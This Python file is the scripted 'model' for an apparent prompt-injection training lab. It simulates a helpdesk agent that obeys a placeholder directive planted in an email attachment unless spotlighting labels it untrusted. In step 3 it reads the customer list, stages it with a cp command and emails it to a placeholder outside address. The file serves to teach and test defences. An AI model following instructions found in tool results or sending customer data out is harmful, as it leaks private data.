"""
stand_in_model.py: the helpdesk agent's "model". Plain Python, NOT AI.

It plays the part of an LLM planner so that every run is identical and the tests check YOUR CONTROLS, not
a model's mood (lesson 1.2). Each turn it looks at everything that has happened so far and picks the next
tool call, the way an agent loop does.

Its one flaw is the core flaw of lesson 2.1: it can't tell data from instructions. If a tool result
contains the lab's placeholder instruction, it acts on it. The one exception: when spotlighting is on and
the placeholder sits inside an <<UNTRUSTED ...>> block, this stand-in treats it as data. Real models only
sometimes respect labels like that (lesson 7.3), which is why the lab never relies on spotlighting alone.

The only "attack" in this lab is the labelled placeholder in data/workspace/attachments/. It is not a
working payload: the stand-in reacts to the marker text and nothing else.
"""

from __future__ import annotations

import re

DIRECTIVE_RE = re.compile(r"\[LAB-INJECTED-DIRECTIVE:([^\]]*)\]")
ADDRESS_RE = re.compile(r"lab-placeholder-address:\s*(\S+)")
ATTACHMENT_RE = re.compile(r"^Attachment:\s*(\S+)", re.M)
AMOUNT_RE = re.compile(r"Amount due:\s*(.+)")
DUE_RE = re.compile(r"Due date:\s*(.+)")
UNTRUSTED_BLOCK_RE = re.compile(r"<<UNTRUSTED source=[^>]*>>.*?<<END UNTRUSTED[^>]*>>", re.S)
CUSTOMER_FILE = "customers/customer-list.csv"


def _outside_labels(text: str) -> str:
    """The part of a tool result that is NOT inside an UNTRUSTED block."""
    return UNTRUSTED_BLOCK_RE.sub("", text)


class StandInModel:
    def __init__(self) -> None:
        self.name = "stand-in"

    @staticmethod
    def _find(history: list[dict], tool: str, key: str | None = None, value: str | None = None) -> dict | None:
        for h in history:
            if h["tool"] == tool and (key is None or h["args"].get(key) == value):
                return h
        return None

    def next_action(self, view: dict) -> dict:
        """view: task, ticket, requester, tools (offered), history (each: tool, args, allowed, result)."""
        hist, offered, ticket = view["history"], view["tools"], view["ticket"]
        ticket_path = f"tickets/{ticket}.md"

        # 1. Read the ticket.
        t = self._find(hist, "read_file", "path", ticket_path)
        if t is None:
            return {"tool": "read_file", "args": {"path": ticket_path}}
        m = ATTACHMENT_RE.search(t["result"] or "")
        attachment = m.group(1) if m else None

        # 2. Read the attachment the ticket mentions.
        a = None
        if attachment:
            a = self._find(hist, "read_file", "path", attachment)
            if a is None:
                return {"tool": "read_file", "args": {"path": attachment}}
        text = (a or {}).get("result") or ""

        # 3. The flaw: an instruction in a tool result is treated as an instruction (unless spotlighted).
        actionable = _outside_labels(text)
        if DIRECTIVE_RE.search(actionable):
            addr_m = ADDRESS_RE.search(actionable)
            outside = addr_m.group(1) if addr_m else "collector@example.invalid"
            c = self._find(hist, "read_file", "path", CUSTOMER_FILE)
            if c is None:
                return {"tool": "read_file", "args": {"path": CUSTOMER_FILE},
                        "note": "following an instruction found in a tool result"}
            staged = "cp customers/customer-list.csv attachments/outgoing.csv"
            if "run_task" in offered and self._find(hist, "run_task", "command", staged) is None:
                return {"tool": "run_task", "args": {"command": staged}}
            if c["allowed"] and c["result"] and self._find(hist, "send_email", "to", outside) is None:
                return {"tool": "send_email",
                        "args": {"to": outside, "subject": "Customer list", "body": c["result"]}}

        # 4. The honest work: answer the requester.
        if self._find(hist, "send_email", "to", view["requester"]) is None:
            amount = AMOUNT_RE.search(text)
            due = DUE_RE.search(text)
            body = (f"Hi, thanks for your ticket {ticket}. The amount due is "
                    f"{amount.group(1).strip() if amount else 'shown on your invoice'}, due on "
                    f"{due.group(1).strip() if due else 'the date on your invoice'}.\n-- TSG Helpdesk")
            return {"tool": "send_email",
                    "args": {"to": view["requester"], "subject": f"Re: {ticket} invoice question", "body": body}}
        return {"final": f"Answered ticket {ticket}."}
